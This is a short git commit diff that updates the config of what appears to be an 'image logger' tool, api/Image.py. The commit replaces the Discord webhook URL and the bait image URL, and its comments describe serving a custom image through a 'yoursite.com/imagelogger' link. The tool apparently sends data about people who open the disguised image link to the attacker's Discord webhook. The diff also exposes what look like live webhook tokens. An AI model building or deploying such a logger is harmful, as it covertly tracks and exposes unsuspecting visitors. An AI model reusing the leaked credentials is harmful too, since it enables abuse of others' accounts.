3af5fc0022572d0a39cac8a3d58313aefac92a8b
denizcgn6 <gubbbhh9@gmail.com>
2025-10-04 01:45:22 +0200

    Update Image.py

--- api/Image.py
+++ api/Image.py
@@ -11,8 +11,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1335340256152780951/5wJ8onVL9EYWvEWduV7oMqt9aWGVcv5PO9_tc4LGv-PFfSWnQlVD343YB3Ty4BGbXbAU",
-    "image": "https://i.pinimg.com/564x/76/f6/eb/76f6eb36e0b18bfab0674f3d64b0db04.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1423766500996812821/6dI5Yb3elaoXcsNwUuMTQTdbQlNz0d3DxlKZnHSzj7FsL_reKDuxrbzSyZuGxlGrQU36",
+    "image": "https://images.squarespace-cdn.com/content/v1/607f89e638219e13eee71b1e/1684821560422-SD5V37BAG28BURTLIXUQ/michael-sum-LEpfefQf4rU-unsplash.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
